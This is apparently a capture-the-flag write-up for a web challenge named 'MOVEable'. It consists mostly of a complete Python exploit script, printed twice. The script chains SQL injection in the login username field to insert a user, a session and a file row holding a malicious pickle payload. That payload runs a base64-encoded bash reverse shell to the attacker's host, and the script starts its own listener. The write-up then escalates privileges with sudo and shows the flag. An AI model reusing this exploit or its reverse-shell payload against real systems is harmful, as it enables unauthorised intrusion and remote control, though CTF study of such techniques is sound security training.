# 2024-10-17 MOVEable (Web)

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

Well shoot we found something 😐

[https://silver-4.gitbook.io/about/this-week/capture-the-flag/transfer](https://silver-4.gitbook.io/about/this-week/capture-the-flag/transfer)

*[image unavailable]*

```python
import pickle, requests, sys, random, base64, os
import threading, telnetlib, socket

URL, LHOST = sys.argv[1], sys.argv[2].replace(':', '/')

print(f"(+) Target URL: {URL}")
print(f"(+) LHOST: {LHOST}")

ngrok = input("\nDo you use ngrok? | y, n: ")

if ngrok == 'y':
    ngrokPort = input("Which port you specify on ngrok? | ex: 443 : ")
    listnerPort = ngrokPort
else:
    listnerPort = LHOST.rsplit('/', 1)[-1]

def doPickle(payload):
    class PickleRce(object):
        def __reduce__(self):
            return (os.system, (payload,))
    
    return base64.b64encode(pickle.dumps(PickleRce()))

def triggerPayload(filename, sessionid):
    print("(+) Trigger payload")
    
    headers = {
        'Host': URL,
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    # Now using session ID in the request
    endpoint = f"{URL}/download/{filename}/{sessionid}"
    print(f"(+) Endpoint: {endpoint}")

    return requests.get(endpoint, headers=headers, verify=False, allow_redirects=False).text

def sendRequest(description, data):
    print(f"(+) {description}")

    headers = {
        'Host': URL,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = f'username={data}&password=1'

    return requests.post(f"{URL}/login", headers=headers, data=data, verify=False, allow_redirects=False).text

def handler(port):
    print(f"(+) Starting handler on port {port}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(port)))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) Got Connection from {addr[0]}")
    t.sock = conn
    print("(+) Silv3r")
    t.interact()

handlerThread = threading.Thread(target=handler, args=(listnerPort,))
handlerThread.start()

# Create user payload
payload = "admin\\;%0aINSERT/**/INTO/**/users/**/(username,password)/**/VALUES/**/(\\38\\,\\123456789\\);--"
sendRequest("Create user", payload)

# Create session payload
payload = "admin\\;%0aINSERT/**/INTO/**/activesessions/**/(sessionid,username,/**/timestamp)/**/VALUES/**/(\\38\\,\\38\\,\\2023-06-16/**/20:06:55.531553\\);--"
sendRequest("Create session", payload)

# Generate random filename and encoded payload for command execution
randNum = random.randint(10000, 99999)
encodedCommand = base64.b64encode(f'bash -i >& /dev/tcp/{LHOST} 0>&1'.encode('utf-8')).decode('utf-8')
Command = f'echo "{encodedCommand}" | base64 -d | bash'
picklePayload = doPickle(Command).decode('utf-8')

# Create file with the Pickle payload
payload = "admin\\;%0aINSERT/**/INTO/**/files/**/(filename,data,/**/sessionid)/**/VALUES/**/(\\REPLACEFILENAME\\,\\REPLACEMEPICKLE\\,\\38\\);--".replace("REPLACEFILENAME", str(randNum)).replace("REPLACEMEPICKLE", picklePayload)
sendRequest("Create file", payload)

# Trigger the payload execution
triggerPayload(randNum, "38")
```

We get a shell

*[image unavailable]*

```shell
sudo /bin/bash
```

Privilege escalate from the sudo -l command and get the flag

*[image unavailable]*

*[image unavailable]*

```python
flag{ac53cd7aa8a2d1b2340a6eb4a356709e}
```

*[image unavailable]*

The exploit used:

*[image unavailable]*

```python
import pickle, requests, sys, random, base64, os
import threading, telnetlib, socket

URL, LHOST = sys.argv[1], sys.argv[2].replace(':', '/')

print(f"(+) Target URL: {URL}")
print(f"(+) LHOST: {LHOST}")

ngrok = input("\nDo you use ngrok? | y, n: ")

if ngrok == 'y':
    ngrokPort = input("Which port you specify on ngrok? | ex: 443 : ")
    listnerPort = ngrokPort
else:
    listnerPort = LHOST.rsplit('/', 1)[-1]

def doPickle(payload):
    class PickleRce(object):
        def __reduce__(self):
            return (os.system, (payload,))
    
    return base64.b64encode(pickle.dumps(PickleRce()))

def triggerPayload(filename, sessionid):
    print("(+) Trigger payload")
    
    headers = {
        'Host': URL,
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    # Now using session ID in the request
    endpoint = f"{URL}/download/{filename}/{sessionid}"
    print(f"(+) Endpoint: {endpoint}")

    return requests.get(endpoint, headers=headers, verify=False, allow_redirects=False).text

def sendRequest(description, data):
    print(f"(+) {description}")

    headers = {
        'Host': URL,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = f'username={data}&password=1'

    return requests.post(f"{URL}/login", headers=headers, data=data, verify=False, allow_redirects=False).text

def handler(port):
    print(f"(+) Starting handler on port {port}")
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(port)))
    s.listen(1)
    conn, addr = s.accept()
    print(f"(+) Got Connection from {addr[0]}")
    t.sock = conn
    print("(+) Silv3r")
    t.interact()

handlerThread = threading.Thread(target=handler, args=(listnerPort,))
handlerThread.start()

# Create user payload
payload = "admin\\;%0aINSERT/**/INTO/**/users/**/(username,password)/**/VALUES/**/(\\38\\,\\123456789\\);--"
sendRequest("Create user", payload)

# Create session payload
payload = "admin\\;%0aINSERT/**/INTO/**/activesessions/**/(sessionid,username,/**/timestamp)/**/VALUES/**/(\\38\\,\\38\\,\\2023-06-16/**/20:06:55.531553\\);--"
sendRequest("Create session", payload)

# Generate random filename and encoded payload for command execution
randNum = random.randint(10000, 99999)
encodedCommand = base64.b64encode(f'bash -i >& /dev/tcp/{LHOST} 0>&1'.encode('utf-8')).decode('utf-8')
Command = f'echo "{encodedCommand}" | base64 -d | bash'
picklePayload = doPickle(Command).decode('utf-8')

# Create file with the Pickle payload
payload = "admin\\;%0aINSERT/**/INTO/**/files/**/(filename,data,/**/sessionid)/**/VALUES/**/(\\REPLACEFILENAME\\,\\REPLACEMEPICKLE\\,\\38\\);--".replace("REPLACEFILENAME", str(randNum)).replace("REPLACEMEPICKLE", picklePayload)
sendRequest("Create file", payload)

# Trigger the payload execution
triggerPayload(randNum, "38")
```
